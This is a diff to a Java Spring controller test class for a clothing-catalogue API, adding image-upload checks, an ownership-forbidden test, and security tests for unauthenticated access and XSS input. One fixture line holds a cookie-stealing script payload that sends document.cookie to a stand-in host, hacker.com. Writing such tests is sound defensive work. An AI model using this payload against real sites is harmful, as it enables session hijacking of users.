@@ -4,6 +4,7 @@ import com.fasterxml.jackson.databind.ObjectMapper;
 import com.ootd.fitme.domain.clothes.dto.ClothesDto;
 import com.ootd.fitme.domain.clothes.dto.request.ClothesCreateRequest;
 import com.ootd.fitme.domain.clothes.dto.request.ClothesDtoCursorRequest;
+import com.ootd.fitme.domain.clothes.dto.request.ClothesUpdateRequest;
 import com.ootd.fitme.domain.clothes.dto.response.ClothesDtoCursorResponse;
 import com.ootd.fitme.domain.clothes.enums.ClothesType;
 import com.ootd.fitme.domain.clothes.enums.SortBy;
@@ -95,15 +96,20 @@ class ClothesControllerTest {
                     objectMapper.writeValueAsBytes(requestDto)
             );
 
+            MockMultipartFile imagePart = new MockMultipartFile(
+                    "image", "test.png", MediaType.IMAGE_PNG_VALUE, "dummy image content".getBytes()
+            );
+
             ClothesDto mockResponse = new ClothesDto(
                     UUID.randomUUID(), loginUserId, "흰 셔츠", null, ClothesType.TOP, List.of()
             );
 
-            given(clothesService.createClothes(any(ClothesCreateRequest.class), any())).willReturn(mockResponse);
+            given(clothesService.createClothes(any(ClothesCreateRequest.class), eq(imagePart), eq(loginUserId))).willReturn(mockResponse);
 
             // when & then
             mockMvc.perform(multipart("/api/clothes")
                             .file(requestPart)
+                            .file(imagePart)
                             .with(authentication(customPrincipalAuthentication))
                             .with(csrf())
                     )
@@ -111,12 +117,13 @@ class ClothesControllerTest {
                     .andExpect(status().isCreated())
                     .andExpect(jsonPath("$.name").value("흰 셔츠"));
 
-            then(clothesService).should(times(1)).createClothes(any(), any());
+            then(clothesService).should(times(1)).createClothes(any(), any(), eq(loginUserId));
         }
 
         @Test
         @DisplayName("[실패] 본인이 아닌 타인의 ID로 옷 생성을 요청하면 403 Forbidden 예외를 던진다.")
         void createClothes_Fail_Forbidden() throws Exception {
+            // given: 공격자가 타인의 ID를 ownerId에 몰래 집어넣음
             UUID maliciousTargetId = UUID.randomUUID();
             ClothesCreateRequest requestDto = new ClothesCreateRequest(
                     maliciousTargetId, "해킹된 셔츠", ClothesType.TOP, List.of()
@@ -126,6 +133,8 @@ class ClothesControllerTest {
                     "request", "", MediaType.APPLICATION_JSON_VALUE,
                     objectMapper.writeValueAsBytes(requestDto)
             );
+            given(clothesService.createClothes(any(ClothesCreateRequest.class), any(), eq(loginUserId)))
+                    .willThrow(new ClothesException(ErrorCode.AUTH_FORBIDDEN));
 
             // when & then
             mockMvc.perform(multipart("/api/clothes")
@@ -140,7 +149,7 @@ class ClothesControllerTest {
                         org.assertj.core.api.Assertions.assertThat(ex.getErrorCode()).isEqualTo(ErrorCode.AUTH_FORBIDDEN);
                     });
 
-            then(clothesService).shouldHaveNoInteractions();
+            then(clothesService).should(times(1)).createClothes(any(), any(), eq(loginUserId));
         }
     }
 
@@ -226,4 +235,67 @@ class ClothesControllerTest {
             then(clothesService).should(times(1)).deleteClothes(eq(clothesId), eq(loginUserId));
         }
     }
+    @Nested
+    @DisplayName("보안 및 권한 (Security) 컨트롤러 테스트")
+    class ControllerSecurityTest {
+        private UUID loginUserId;
+        private Authentication mockAuthentication;
+
+        @BeforeEach
+        void setUpSecurity() {
+            loginUserId = UUID.randomUUID();
+
+            CustomUserPrincipal mockPrincipal = mock(CustomUserPrincipal.class);
+            given(mockPrincipal.getUserId()).willReturn(loginUserId);
+
+            mockAuthentication = new TestingAuthenticationToken(mockPrincipal, null, "ROLE_USER");
+        }
+
+        @Test
+        @DisplayName("[보안/실패] 인증 토큰(Security Context) 없이 API에 접근하면 접근이 차단된다 (401/403)")
+        void access_Without_Token_Blocked() throws Exception {
+            // given: 인증 객체(mockAuthentication)를 주입하지 않은 순수 무방비 요청
+
+            // when & then
+            mockMvc.perform(get("/api/clothes")
+                                    .param("limit", "20")
+                    )
+                    .andDo(print())
+                    .andExpect(status().is4xxClientError());
+
+            then(clothesService).shouldHaveNoInteractions();
+        }
+
+        @Test
+        @DisplayName("[보안/성공] 컨트롤러는 파라미터로 넘어온 악성 XSS 스크립트를 조작 없이 서비스 계층으로 안전하게 넘긴다.")
+        void pass_Xss_Payload_To_Service_Safely() throws Exception {
+            // given: 해커가 옷 이름에 악성 스크립트를 삽입함
+            String maliciousXssPayload = "<script>location.href='http://hacker.com?cookie='+document.cookie;</script> 후드티";
+            UUID clothesId = UUID.randomUUID();
+
+            given(clothesService.updateClothes(eq(clothesId), eq(loginUserId), any(ClothesUpdateRequest.class), any()))
+                    .willReturn(new ClothesDto(clothesId, loginUserId, "안전한이름", null, ClothesType.TOP, List.of()));
+
+            // when & then
+            mockMvc.perform(multipart("/api/clothes/{clothesId}", clothesId)
+                            .param("name", maliciousXssPayload) // XSS 페이로드 전송
+                            .with(request -> {
+                                request.setMethod(HttpMethod.PATCH.name());
+                                return request;
+                            })
+                            .with(authentication(mockAuthentication))
+                            .with(csrf())
+                    )
+                    .andDo(print())
+                    .andExpect(status().isOk());
+
+            then(clothesService).should(times(1)).updateClothes(
+                    eq(clothesId),
+                    eq(loginUserId),
+                    org.mockito.ArgumentMatchers.argThat(req -> req.name().equals(maliciousXssPayload)), // 페이로드 원본 전달 확인
+                    any()
+            );
+        }
+    }
+
 }
